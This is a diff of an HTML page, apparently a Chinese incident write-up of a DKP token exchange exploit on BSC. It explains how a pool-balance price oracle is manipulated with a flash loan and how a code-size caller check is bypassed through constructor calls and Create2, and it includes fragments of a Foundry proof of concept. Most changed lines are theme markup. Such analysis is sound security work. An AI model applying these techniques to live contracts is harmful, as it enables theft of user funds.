+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>合约中 <code>require(msg.sender.code.size &lt;= 0, Error('no isContract'));</code> 这行代码是检查函数调用者不能是合约, 开发者还是有一点安全意识的(但不多), 怕被黑干脆不让合约调用.</p>
+<h3 class="heading-element" id="重点代码2"><span>重点代码2</span>
+  <a href="#%e9%87%8d%e7%82%b9%e4%bb%a3%e7%a0%812" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><code>v5 = 0x1201();</code> 转到函数 0x1201代码如下:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -295,24 +317,23 @@
 </span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">stor_3_0_19</span><span class="p">.</span><span class="nb">code</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">v0</span><span class="p">,</span> <span class="n">v1</span> <span class="o">=</span> <span class="n">stor_3_0_19</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">_lp</span><span class="p">).</span><span class="nb">gas</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">gas</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">v0</span><span class="p">);</span> <span class="c1">// checks call status, propagates error data on error
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="n">RETURNDATASIZE</span><span class="p">()</span> <span class="o">+</span> <span class="mi">31</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0x1f</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">    <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="n">RETURNDATASIZE</span><span class="p">()</span> <span class="o">+</span> <span class="mi">31</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0x1f</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="n">RETURNDATASIZE</span><span class="p">()</span> <span class="o">-</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">32</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="mh">0x2a44</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">_usdt</span><span class="p">.</span><span class="nb">code</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">v2</span><span class="p">,</span> <span class="n">v3</span> <span class="o">=</span> <span class="n">_usdt</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">_lp</span><span class="p">).</span><span class="nb">gas</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">gas</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">v2</span><span class="p">);</span> <span class="c1">// checks call status, propagates error data on error
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="n">RETURNDATASIZE</span><span class="p">()</span> <span class="o">+</span> <span class="mi">31</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0x1f</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">    <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="n">RETURNDATASIZE</span><span class="p">()</span> <span class="o">+</span> <span class="mi">31</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0x1f</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="n">RETURNDATASIZE</span><span class="p">()</span> <span class="o">-</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">32</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="mh">0x2a44</span><span class="p">(</span><span class="n">v3</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">=</span> <span class="mh">0x1af2</span><span class="p">(</span><span class="mh">0xde0b6b3a7640000</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="mh">0x1b6d</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">v5</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><p>其中<code>0x1b6d</code></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
@@ -324,14 +345,13 @@
 </span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">varg0</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="n">Error</span><span class="p">(</span><span class="s">&#39;SafeMath: division by zero&#39;</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">    <span class="n">v0</span> <span class="o">=</span> <span class="n">_SafeDiv</span><span class="p">(</span><span class="n">varg1</span><span class="p">,</span> <span class="n">varg0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">v0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>也就是说, 其先查询了<code>_lp</code>在<code>stor_3_0_19</code>和<code>_usdt</code>这两个token上的余额, 然后返回值是两个数相除, 嗯, 嗅到了不安全的味道~</p>
 <p>继续搞清楚<code>_lp</code> ,<code>stor_3_0_19</code>和<code>_usdt</code>  分别指的什么:</p>
 <p>查看反编译代码的开头部分</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
@@ -339,12 +359,11 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">uint160 _lp; // STORAGE[0x1] bytes 0 to 19
 </span></span><span class="line"><span class="cl">address _usdt; // STORAGE[0x2] bytes 0 to 19
-</span></span><span class="line"><span class="cl">address stor_3_0_19; // STORAGE[0x3] bytes 0 to 19
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">address stor_3_0_19; // STORAGE[0x3] bytes 0 to 19</span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>它们分别在slot1, slot2, solt3, 为了读出他们值,我们利用一下小工具: <a href="https://github.com/yinhui1984/GetStorageAt" target="_blank" rel="noopener noreffer ">https://github.com/yinhui1984/GetStorageAt</a></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+</div><p>它们分别在slot1, slot2, solt3, 为了读出他们值,我们利用一下小工具: <a href="https://github.com/yinhui1984/GetStorageAt" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/yinhui1984/GetStorageAt</a></p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-apl"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -388,27 +407,38 @@
 </span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">INT</span><span class="bp">:</span>     <span class="m">1189959551584444714248724787054917716618572582681</span>
 </span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">BYTES</span><span class="bp">:</span>   <span class="nv">b</span><span class="s1">&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd0o\xa1\xba|\x80\xf8\xe1\x13\xc2\xdcf\x9a#\xa9RGu\xcf\x19&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">STRING</span><span class="bp">:</span>  <span class="nv">Not</span> <span class="nv">a</span> <span class="nv">string</span>
-</span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">ADDRESS</span><span class="bp">:</span> <span class="m">0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">ADDRESS</span><span class="bp">:</span> <span class="m">0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><p>分别是3个地址</p>
-<p><a href="https://bscscan.com/address/0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7" target="_blank" rel="noopener noreffer ">0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7</a>  : PancakeSwapV2 上的一个PAIR</p>
-<p><a href="https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955" target="_blank" rel="noopener noreffer ">0x55d398326f99059fF775485246999027B3197955 </a> : BUSD</p>
-<p><a href="https://bscscan.com/address/0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19" target="_blank" rel="noopener noreffer ">0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19</a>  : DKP token</p>
+<p><a href="https://bscscan.com/address/0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7" target="_blank" rel="external nofollow noopener noreferrer">0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7</a>  : PancakeSwapV2 上的一个PAIR</p>
+<p><a href="https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955" target="_blank" rel="external nofollow noopener noreferrer">0x55d398326f99059fF775485246999027B3197955 </a> : BUSD</p>
+<p><a href="https://bscscan.com/address/0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19" target="_blank" rel="external nofollow noopener noreferrer">0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19</a>  : DKP token</p>
 <p>也就是说<code>0x1201()</code>函数,  查询了 PancakeSwapV2 上的一个PAIR的 BUSD 和 DKP 余额, 然后将余额相除并返回. 继续研究代码发现<code>exchange()</code>函数就是用的这个<code>0x1201()</code>函数进行的价格查询,以便将一定数量的美元换成DKP 给用户 (实际就是实现了一个买币函数)</p>
 <p>这就给了黑客价格操纵的机会.</p>
-<h2 id="漏洞利用">漏洞利用</h2>
-<h3 id="价格操纵">价格操纵</h3>
-<p>日常操作, 利用闪电贷在<code>0x1201()</code>查询价格时用到的PAIR中借走绝大多数BUSD, 由于<code>0x1201()</code>是按照PAIR中BUSD和DKP的余额比例来计算价格的, 这就可以让其计算出DKP token价格异常&quot;便宜&quot;(并不是让市场上的价格变便宜, 而是让<code>0x1201()</code>计算出一个错误的很便宜的价格), 然后攻击者就可以用少量的BUSD进行大量买入. 然后再到市场上以正常的价格卖出而获利.</p>
-<h3 id="绕过合约检查">绕过合约检查</h3>
-<p>由于<code>exchange</code>函数中  <code>require(msg.sender.code.size &lt;= 0, Error('no isContract'));</code> 条件的限制, 攻击合约是不能直接调用<code>exchange</code>函数的.</p>
-<p>但是, 使用代码size是否为0来作为调用是否来自合约的判断条件是有问题的. 合约在&quot;run time&quot;时代码size是大于0的,但在&quot;creation time&quot;,由于合约还正在部署过程中,所以其code size这时为0, 要在&quot;creation time&quot;执行代码逻辑,那自然就是合约的构造函数, 所以在合约的构造函数中调用<code>exchange</code>函数是可以绕过上面的条件检查的. 关于这个问题可以参考 <a href="https://github.com/yinhui1984/EthernautGameReferenceAnswers/blob/main/15_GatekepperTwo.md" target="_blank" rel="noopener noreffer ">Ethernaut第15个挑战题目</a></p>
+<h2 class="heading-element" id="漏洞利用"><span>漏洞利用</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="价格操纵"><span>价格操纵</span>
+  <a href="#%e4%bb%b7%e6%a0%bc%e6%93%8d%e7%ba%b5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>日常操作, 利用闪电贷在<code>0x1201()</code>查询价格时用到的PAIR中借走绝大多数BUSD, 由于<code>0x1201()</code>是按照PAIR中BUSD和DKP的余额比例来计算价格的, 这就可以让其计算出DKP token价格异常&quot;便宜&quot;(并不是让市场上的价格变便宜, 而是让<code>0x1201()</code>计算出一个错误的很便宜的价格), 然后攻击者就可以用少量的BUSD进行大量买入. 然后再到市场上以正常的价格卖出而获利.</p>
+<h3 class="heading-element" id="绕过合约检查"><span>绕过合约检查</span>
+  <a href="#%e7%bb%95%e8%bf%87%e5%90%88%e7%ba%a6%e6%a3%80%e6%9f%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>由于<code>exchange</code>函数中  <code>require(msg.sender.code.size &lt;= 0, Error('no isContract'));</code> 条件的限制, 攻击合约是不能直接调用<code>exchange</code>函数的.</p>
+<p>但是, 使用代码size是否为0来作为调用是否来自合约的判断条件是有问题的. 合约在&quot;run time&quot;时代码size是大于0的,但在&quot;creation time&quot;,由于合约还正在部署过程中,所以其code size这时为0, 要在&quot;creation time&quot;执行代码逻辑,那自然就是合约的构造函数, 所以在合约的构造函数中调用<code>exchange</code>函数是可以绕过上面的条件检查的. 关于这个问题可以参考 <a href="https://github.com/yinhui1984/EthernautGameReferenceAnswers/blob/main/15_GatekepperTwo.md" target="_blank" rel="external nofollow noopener noreferrer">Ethernaut第15个挑战题目</a></p>
 <p>另外一个问题是,  调用<code>exchange</code>需要钱(去买DKP), 如何在合约还没部署完成时向合约转账,让它有钱呢.</p>
 <p>所以需要事先知道合约的地址, 向其转账,然后再部署合约,部署合约时再其构造函数中进行<code>exchange</code>调用.</p>
-<p>这就需要用到Create2: <a href="https://github.com/yinhui1984/SolidityReference/blob/main/docs/new.md#create2" target="_blank" rel="noopener noreffer ">https://github.com/yinhui1984/SolidityReference/blob/main/docs/new.md#create2</a></p>
-<h2 id="poc">POC</h2>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<p>这就需要用到Create2: <a href="https://github.com/yinhui1984/SolidityReference/blob/main/docs/new.md#create2" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/yinhui1984/SolidityReference/blob/main/docs/new.md#create2</a></p>
+<h2 class="heading-element" id="poc"><span>POC</span>
+  <a href="#poc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="3" style="--fi-max-shown-lines:10;--fi-line-digit:3;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
@@ -567,7 +597,7 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: SEE LICENSE IN LICENSE
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/Test.sol&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
@@ -640,11 +670,11 @@
 </span></span><span class="line"><span class="cl">        <span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">//借走PAIR中的绝大部分BUSD，让DKP变得非常便宜
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">flashAmount</span> <span class="o">=</span> <span class="n">caculateSwapAmount</span><span class="p">();</span>
+</span></span></span><span class="line"><span class="cl">        <span class="n">flashAmount</span> <span class="o">=</span> <span class="n">caculateSwapAmount</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">        <span class="n">Pair</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="n">flashAmount</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encode</span><span class="p">(</span><span class="n">flashAmount</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">//兑换BUSD，贷款回调执行完成后再兑换，否则报错&#34;Pancake: LOCKED&#34;
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">DKP2BUSD</span><span class="p">();</span>
+</span></span></span><span class="line"><span class="cl">        <span class="n">DKP2BUSD</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">            <span class="s">&#34;BUSD balance at the end&#34;</span><span class="p">,</span>
@@ -655,12 +685,12 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">pancakeCall</span><span class="p">(</span><span class="kt">address</span><span class="p">,</span> <span class="kt">uint256</span><span class="p">,</span> <span class="kt">uint256</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">calldata</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">//不能直接调用,其判断了调用方是否是合约，其只允许EOA进行exchange
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//DKPExchange.exchange(xxx); // 报错： &#34;no isContract&#34;
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//use this:
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">address</span> <span class="n">calcultedAddress</span> <span class="o">=</span> <span class="n">calculteSpecialContractAddress</span><span class="p">();</span>
+</span></span></span><span class="line"><span class="cl">        <span class="c1">//DKPExchange.exchange(xxx); // 报错： &#34;no isContract&#34;
+</span></span></span><span class="line"><span class="cl">        <span class="c1">//use this:
+</span></span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">calcultedAddress</span> <span class="o">=</span> <span class="n">calculteSpecialContractAddress</span><span class="p">();</span>
